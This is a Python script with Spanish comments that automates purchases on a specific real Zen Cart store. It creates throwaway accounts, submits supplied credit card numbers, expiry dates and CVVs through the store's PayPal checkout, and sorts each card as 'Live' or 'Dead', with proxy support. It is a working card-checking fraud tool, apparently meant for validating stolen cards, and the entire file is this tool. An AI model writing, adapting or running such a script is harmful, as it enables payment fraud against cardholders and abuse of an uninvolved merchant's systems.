import asyncio
import aiohttp
import re
import random
import string

async def process_zippkits(cc, mes, ano, cvv, proxy=None):
    """
    zippkits.com (Zen Cart)
    Retorna (status, mensaje)
    """
    base_url = "https://zippkits.com"
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
    
    # Headers base
    headers = {
        "User-Agent": user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive"
    }

    # Generar datos aleatorios
    email = "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"
    pwd = "".join(random.choices(string.ascii_letters + string.digits, k=12))
    name = "Juan"
    last = "Perez"

    async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar()) as session:
        try:
            # 1. Obtener securityToken inicial
            async with session.get(f"{base_url}/index.php?main_page=product_info&products_id=586", proxy=proxy) as r:
                html = await r.text()
                token = re.search(r'name="securityToken" value="([a-f0-9]+)"', html).group(1)

            # 2. Agregar al carrito
            data_cart = {'securityToken': token, 'cart_quantity': '1', 'products_id': '586'}
            await session.post(f"{base_url}/index.php?main_page=product_info&action=add_product&products_id=586", data=data_cart, proxy=proxy)

            # 3. Crear cuenta rápida (necesario en esta tienda)
            async with session.get(f"{base_url}/index.php?main_page=create_account", proxy=proxy) as r:
                html = await r.text()
                token = re.search(r'name="securityToken" value="([a-f0-9]+)"', html).group(1)

            data_acc = {
                'securityToken': token, 'action': 'process', 'firstname': name, 'lastname': last,
                'email_address': email, 'street_address': '123 Street', 'city': 'New York',
                'postcode': '10001', 'telephone': '2125551234', 'zone_id': '43', 'zone_country_id': '223',
                'password': pwd, 'confirmation': pwd, 'email_format': 'HTML'
            }
            await session.post(f"{base_url}/index.php?main_page=create_account", data=data_acc, proxy=proxy)

            # 4. Configurar Envío y Pago vía AJAX (Paso Crítico para evitar errores)
            checkout_url = f"{base_url}/index.php?main_page=checkout_one"
            ajax_headers = {**headers, "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded"}
            
            # Update Shipping
            await session.post(f"{base_url}/ajax.php?act=ajaxOnePageCheckout&method=updateShipping", 
                               data=f"securityToken={token}&shipping=freeunder_freeunder&shipping_is_billing=true&payment=paypaldp", 
                               headers=ajax_headers, proxy=proxy)
            
            # Update Payment
            await session.post(f"{base_url}/ajax.php?act=ajaxOnePageCheckout&method=updatePaymentMethod", 
                               data=f"securityToken={token}&payment=paypaldp", 
                               headers=ajax_headers, proxy=proxy)

            # 5. Enviar Tarjeta al Confirmation
            data_cc = {
                'securityToken': token, 'action': 'process', 'payment': 'paypaldp',
                'paypalwpp_cc_number': cc, 'paypalwpp_cc_expires_month': mes, 
                'paypalwpp_cc_expires_year': ano[-2:], 'paypalwpp_cc_checkcode': cvv,
                'order_confirmed': '1', 'current_order_total': '$6.15'
            }
            
            async with session.post(f"{base_url}/index.php?main_page=checkout_one_confirmation", data=data_cc, proxy=proxy) as r:
                html = await r.text()
# 6. Manejo de Confirmación Intermedia (Zen Cart auto-submit)
            if 'form name="checkout_confirmation"' in html:
                confirm_token = re.search(r'name="securityToken" value="([a-f0-9]+)"', html).group(1)
                # Extraer todos los hidden de la confirmación
                inputs = re.findall(r'input type="hidden" name="([^"]+)" value="([^"]*)"', html)
                final_data = {n: v for n, v in inputs}
                final_data['securityToken'] = confirm_token
                
                async with session.post(f"{base_url}/index.php?main_page=checkout_process", data=final_data, proxy=proxy) as r:
                    html = await r.text()

            # 7. Analizar Resultado Final
            if "checkout_success" in str(session.cookie_jar) or "Thank You" in html:
                return "Live", "¡Pago Exitoso!"
            
            # Extraer error del div alert
            error_match = re.search(r'class="alert alert-danger[^>]*>(.*?)</div>', html, re.DOTALL)
            if error_match:
                msg = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
                status = "Live" if "15004" in msg else "Dead" 
                return status, msg
            
            return "Unknown", "No se pudo determinar el resultado."

        except Exception as e:
            return "Error", str(e)